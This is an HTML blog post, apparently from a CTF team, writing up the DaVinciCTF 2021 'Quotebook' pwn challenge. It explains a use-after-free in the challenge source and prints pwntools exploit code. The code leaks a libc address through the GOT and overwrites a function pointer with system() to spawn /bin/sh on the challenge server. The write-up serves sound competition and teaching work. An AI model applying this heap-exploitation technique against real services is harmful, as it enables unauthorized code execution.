@@ -1,0 +1,239 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[DaVinciCTF 2021 - pwn] Quotebook // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.81.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[DaVinciCTF 2021 - pwn] Quotebook"/>
+<meta name="twitter:description" content="Da Vinci CTF 2021 - Quotebook (499 pts) The subject of this task was:
+ I created this amazing service to store all my famous quotes. Can you get the flag?
+nc challs.dvc.tf 2222
+ We are given the binary, the source code for it and the libc used on the server. We&rsquo;ll need to find a vuln into the binary to get a shell and grab a flag from the server (typical pwn task)."/>
+
+    <meta property="og:title" content="[DaVinciCTF 2021 - pwn] Quotebook" />
+<meta property="og:description" content="Da Vinci CTF 2021 - Quotebook (499 pts) The subject of this task was:
+ I created this amazing service to store all my famous quotes. Can you get the flag?
+nc challs.dvc.tf 2222
+ We are given the binary, the source code for it and the libc used on the server. We&rsquo;ll need to find a vuln into the binary to get a shell and grab a flag from the server (typical pwn task)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/dvctf_quotebook/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-03-15T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-03-15T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/nasm_re" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[DaVinciCTF 2021 - pwn] Quotebook</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 15, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
+              <a class="tag" href="https://ret2school.github.io/tags/heap/">heap</a>
+              <a class="tag" href="https://ret2school.github.io/tags/2021/">2021</a>
+              <a class="tag" href="https://ret2school.github.io/tags/supersnail/">supersnail</a>
+              <a class="tag" href="https://ret2school.github.io/tags/aassfxxx/">aaSSfxxx</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="da-vinci-ctf-2021---quotebook-499-pts">Da Vinci CTF 2021 - Quotebook (499 pts)</h1>
+<p>The subject of this task was:</p>
+<blockquote>
+<p>I created this amazing service to store all my famous quotes. Can you get the flag?</p>
+<p>nc challs.dvc.tf 2222</p>
+</blockquote>
+<p>We are given the binary, the source code for it and the libc used on the server. We&rsquo;ll need to find a vuln into the binary to get a shell and grab a flag from the server (typical pwn task).</p>
+<h2 id="source-analysis">Source analysis</h2>
+<p>When looking at the source code, we can see that a quote is defined like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> quote_t quote_t;
+<span style="color:#ff79c6">struct</span> quote_t
+{
+    <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> content;
+    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> content_size;
+    <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> title;
+    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> title_size;
+    <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>write)(quote_t <span style="color:#ff79c6">*</span>);
+    <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>read)(quote_t <span style="color:#ff79c6">*</span>);
+};
+</code></pre></div><p>and we have an array to store the quotes with a variable which indexes the &ldquo;current&rdquo; quote:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">quote_t <span style="color:#ff79c6">*</span> book[NB_PAGE];
+<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> book_ctr;
+</code></pre></div><p>So, when a quote is created, a buffer of <code>sizeof(quote_t)</code> is allocated, then the program asks the title and content size, to allocate buffers from the given size. Then the title and contents are read from <code>stdin</code>.</p>
+<p>The interesting things happen when freeing a quote:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#8be9fd">int</span> choice <span style="color:#ff79c6">=</span> get_choice(<span style="color:#f1fa8c">&#34;Quote number&#34;</span>);
+    <span style="color:#ff79c6">if</span>(choice <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">||</span> choice <span style="color:#ff79c6">&gt;=</span> book_ctr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>)
+    {
+        puts(<span style="color:#f1fa8c">&#34;[!] Error : wrong quote number !&#34;</span>);
+    }
+    <span style="color:#ff79c6">else</span>
+    {
+        free(book[choice <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>]);
+        book_ctr<span style="color:#ff79c6">--</span>;
+    }
+</code></pre></div><p>First of all, the buffers containing the title and quote are not freed (enjoy ur memory leak), and even freed, the pointer is still present on the <code>book</code> array, and the book_ctr is decremented (which is useless since you can control which entry you want to free).
+So from there we can trigger an use-after-free vulnerability.</p>
+<h2 id="leaking-libc-address">Leaking libc address</h2>
+<p>If we create a quote and destroy it afterwards, the <code>book</code> array still contains the address of the freed buffer. This means that if we can control program allocations, then we can write anything we want on that buffer, while the program still believes it&rsquo;s a <code>quote_t</code> structure.</p>
+<p>And remember, we can allocate buffers from the size we want while creating a quote, and write what we want on it. And since we can list quotes:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">quote_read</span>(quote_t <span style="color:#ff79c6">*</span> quote)
+{
+    printf(<span style="color:#f1fa8c">&#34;[+] %s&#34;</span>, quote<span style="color:#ff79c6">-&gt;</span>title);
+    printf(<span style="color:#f1fa8c">&#34;[&gt;] %s&#34;</span>, quote<span style="color:#ff79c6">-&gt;</span>content);
+}
+</code></pre></div><p>, if <code>content</code> or <code>title</code> point to the binary&rsquo;s GOT section, then we can leak a libc&rsquo;s function address, and then getting the libc base.</p>
+<p>But we have to be careful, because <code>book_ctr</code> is decremented, if we only create one quote and remove it, its pointer will be overwritten by the new quote we create. So let&rsquo;s create 3 quotes, with buffers of size 1. The heap will look like something like this:</p>
+<pre><code>-----------------------------------------------
+| first struct | second struct | third struct |
+-----------------------------------------------
+    book[0]        book[1]         book[2]
+</code></pre><p>The small buffers we allocated are placed in another heap arena (since they are 1 bytes long)</p>
+<p>Now, we&rsquo;ll delete the first two structs, the heap will now look like this:</p>
+<pre><code>------------------------------------------------
+| freed chunk  |  freed chunk  |  third struct |
+------------------------------------------------
+    book[0]        book[1]         book[2]
+</code></pre><p>And this time we&rsquo;ll create a new quote (on <code>book[book_ctr]</code>), but with a sizeof(quote) length, so the heap will look like this:</p>
+<pre><code>------------------------------------------------
+| book1 buffer |  freed chunk  |  third struct |
+------------------------------------------------
+    book[0]        book[1]         book[2]
+</code></pre><p>We can clearly see that the freed chunk pointed by book[0] contains the second&rsquo;s quote buffer, and we can craft a fake <code>quote_t</code> struct with program&rsquo;s GOT  as title pointer.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4"># Craft UAF with title overwriting first quote_t structure</span>
+s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;2&#34;</span>)
+<span style="color:#ff79c6">print</span>(s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;size &gt; &#39;</span>))
+<span style="color:#6272a4"># title size</span>
+s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1&#34;</span>)
+<span style="color:#ff79c6">print</span>(s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39; size &gt; &#39;</span>))
+<span style="color:#6272a4"># content size</span>
+s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;48&#34;</span>)
+s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;Title &gt; &#39;</span>)
+
+PRINTF_ADDR <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x404030</span>
+RANDOM_BUF <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4040c0</span>
+<span style="color:#6272a4">#### Craft structure to leak libc ###</span>
+<span style="color:#6272a4"># Pack content and content size</span>
+buf <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>pack(RANDOM_BUF, <span style="color:#bd93f9">64</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>pack(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">64</span>)
+<span style="color:#6272a4"># Pack title addr and size (printf addr in PLT)</span>
+buf <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>pack(PRINTF_ADDR, <span style="color:#bd93f9">64</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>pack(<span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">64</span>)
+<span style="color:#6272a4"># Set function pointers</span>
+buf <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>pack(<span style="color:#bd93f9">0x401236</span>, <span style="color:#bd93f9">64</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>pack(<span style="color:#bd93f9">0x401294</span>, <span style="color:#bd93f9">64</span>)
+
+<span style="color:#6272a4"># Send title</span>
+s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;a&#34;</span>)
+<span style="color:#ff79c6">print</span>(<span style="color:#8be9fd;font-style:italic">str</span>(s<span style="color:#ff79c6">.</span>recv(), <span style="color:#f1fa8c">&#39;ascii&#39;</span>))
+
+<span style="color:#6272a4"># Send content</span>
+s<span style="color:#ff79c6">.</span>sendline(buf)
+<span style="color:#ff79c6">print</span>(<span style="color:#8be9fd;font-style:italic">str</span>(s<span style="color:#ff79c6">.</span>recv(), <span style="color:#f1fa8c">&#39;ascii&#39;</span>))
+
+<span style="color:#6272a4"># Display quote and trigger UAF</span>
+s<span style="color:#ff79c6">.</span>recv()
+s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;3&#34;</span>)
+<span style="color:#ff79c6">print</span>(s<span style="color:#ff79c6">.</span>recv())
+s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1&#34;</span>)
+s<span style="color:#ff79c6">.</span>recvline()
+leak <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvline() <span style="color:#6272a4"># quote contents contain printf addr</span>
+</code></pre></div><p>This way we can get the glibc&rsquo;s printf address, and compute system() address by doing:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">leak <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvline()
+puts_leak <span style="color:#ff79c6">=</span> leak[<span style="color:#bd93f9">4</span>:<span style="color:#bd93f9">4</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">6</span>]
+addr <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>unpack(puts_leak, <span style="color:#8be9fd;font-style:italic">len</span>(puts_leak)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>)
+libc_base <span style="color:#ff79c6">=</span> addr <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#34;printf&#34;</span>]
+system_addr <span style="color:#ff79c6">=</span> libc_base <span style="color:#ff79c6">+</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#34;system&#34;</span>]
+</code></pre></div><p>Now, let&rsquo;s get a shell !</p>
+<h2 id="pwning-the-app-and-getting-a-shell">Pwning the app and getting a shell</h2>
+<p>Fortunately , the program allows us to edit a quote, this basically means replacing the old buffer&rsquo;s content by something else. Also, the program contains function pointers that we can overwrite to redirect to any address we want since we can craft a whole quote_t structure.</p>
+<p>The function pointers have this prototype:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>write)(quote_t <span style="color:#ff79c6">*</span>);
+    <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>read)(quote_t <span style="color:#ff79c6">*</span>);
+</code></pre></div><p>So it would be nice to redirect the control flow to a function which takes one argument, and luckily we have: <code>system(char *command)</code> to do this.</p>
+<p>So to get a shell we need to:</p>
+<ul>
+<li>put the <code>/bin/sh</code> string at the beginning of the buffer</li>
+<li>put system address we got from the leak before at the <code>write</code> function pointer (since <code>read</code> gets overwritten because the programs insert a newline)</li>
+<li>Edit the first quote (the crafted one) to call our function pointer</li>
+<li>???</li>
+<li>PROFIT</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4"># Edit the second quote so we can control first&#39;s quote buffer</span>
+s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;4&#34;</span>)
+s<span style="color:#ff79c6">.</span>recv()
+s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;2&#34;</span>)
+<span style="color:#6272a4"># Craft our content buffer</span>
+b <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>pack(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">64</span>)
+<span style="color:#6272a4"># Padding to reach function pointers</span>
+b <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span> <span style="color:#bd93f9">16</span>
+b <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>pack(system_addr, <span style="color:#bd93f9">64</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">2</span>
+s<span style="color:#ff79c6">.</span>sendline(b)
+s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;Choice number &gt; &#39;</span>)
+
+<span style="color:#6272a4"># Edit the first quote to trigger system()</span>
+s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;4&#34;</span>)
+s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;Quote number &gt; &#39;</span>)
+s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1&#34;</span>)
+<span style="color:#6272a4"># Get the shell</span>
+s<span style="color:#ff79c6">.</span>interactive()
+</code></pre></div><p>You can find the file <a href="https://github.com/ret2school/ctf/tree/master/2021/dvctf/pwn/quotebook">here</a></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
